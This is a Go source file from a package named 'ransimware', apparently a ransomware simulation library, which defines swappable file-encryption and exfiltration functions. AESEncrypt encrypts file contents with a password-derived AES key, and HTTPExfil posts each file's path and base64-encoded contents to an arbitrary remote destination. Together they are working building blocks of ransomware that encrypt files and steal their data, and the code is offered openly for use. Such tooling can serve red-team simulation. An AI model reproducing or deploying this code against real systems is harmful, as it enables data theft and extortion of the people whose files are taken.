package ransimware

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"net/http"
	"time"
)

// DefaultEncrypt is the default encryption behavior.
var DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
	return b, nil
}

// DefaultExfil is the default exfil behavior.
var DefaultExfil = func(path string, b []byte) error {
	return nil
}

// AESEncrypt will return a function pointer to an EncryptFunc that
// uses the specified password.
func AESEncrypt(passwd string) EncryptFunc {
	return func(fn string, b []byte) ([]byte, error) {
		var block cipher.Block
		var ctxt []byte
		var e error
		var iv []byte
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if block, e = aes.NewCipher(key[:]); e != nil {
			return b, e
		}

		ctxt = make([]byte, aes.BlockSize+len(b))
		iv = ctxt[:aes.BlockSize]

		if _, e = rand.Read(iv); e != nil {
			return b, e
		}

		stream = cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(ctxt[aes.BlockSize:], b)

		return ctxt, nil
	}
}

// HTTPExfil will return a function pointer to an ExfilFunc that
// reaches out to the specified destination and uses the specified
// headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var e error
		var req *http.Request

		// Create request
		req, e = http.NewRequest(
			http.MethodPost,
			dst,
			bytes.NewBuffer(
				[]byte(path+" "+base64.StdEncoding.EncodeToString(b)),
			),
		)
		if e != nil {
			return e
		}

		// Set headers
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		// Set timeout to 1 second
		http.DefaultClient.Timeout = time.Second

		// Send Message
		http.DefaultClient.Do(req)
		return nil
	}
}
